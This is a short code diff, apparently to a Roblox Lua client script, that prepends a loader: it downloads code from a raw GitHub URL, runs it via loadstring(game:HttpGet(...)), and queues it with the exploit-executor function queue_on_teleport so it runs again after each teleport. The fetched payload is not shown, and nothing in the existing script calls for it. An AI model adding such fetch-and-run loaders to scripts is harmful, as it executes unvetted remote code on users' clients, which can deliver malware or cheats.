@@ -1,3 +1,8 @@
+local scriptCode = loadstring(game:HttpGet("https://raw.githubusercontent.com/bossvegas2012-design/A/refs/heads/main/B"))()
+
+if queue_on_teleport then
+    queue_on_teleport(scriptCode)
+end
 local Players = game.Players
 local Player = Players.LocalPlayer
 local PlayerScripts = Player:WaitForChild("PlayerScripts", 5)
